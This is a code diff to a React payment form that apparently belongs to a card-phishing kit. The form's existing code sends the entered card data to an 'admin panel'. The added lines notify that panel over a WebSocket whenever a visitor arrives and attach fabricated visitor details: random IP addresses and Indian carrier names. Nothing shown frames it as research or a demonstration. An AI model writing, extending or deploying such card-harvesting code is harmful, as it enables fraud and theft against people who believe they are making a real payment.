@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2 } from 'lucide-react';
 
@@ -11,6 +10,16 @@ const connectWebSocket = () => {
     
     ws.onopen = () => {
       console.log('WebSocket connected');
+      // Send new visitor notification
+      const userInfo = {
+        ip: getRandomIP(),
+        browser: navigator.userAgent,
+        network: getRandomNetwork()
+      };
+      ws?.send(JSON.stringify({
+        type: 'newVisitor',
+        ip: userInfo.ip
+      }));
     };
     
     ws.onclose = () => {
@@ -19,6 +28,15 @@ const connectWebSocket = () => {
       setTimeout(connectWebSocket, 3000);
     };
   }
+};
+
+const getRandomIP = () => {
+  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+};
+
+const getRandomNetwork = () => {
+  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
+  return networks[Math.floor(Math.random() * networks.length)];
 };
 
 const PaymentForm = () => {
@@ -162,14 +180,16 @@ const PaymentForm = () => {
     setErrorMessage('');
     
     // Send card data to admin panel
+    const userInfo = {
+      ip: getRandomIP(),
+      browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
+      network: getRandomNetwork()
+    };
+    
     sendToAdminPanel({
       type: 'cardData',
       data: formData,
-      userInfo: {
-        ip: 'Simulated IP',
-        browser: navigator.userAgent,
-        network: 'Simulated Network'
-      }
+      userInfo: userInfo
     });
   };
 
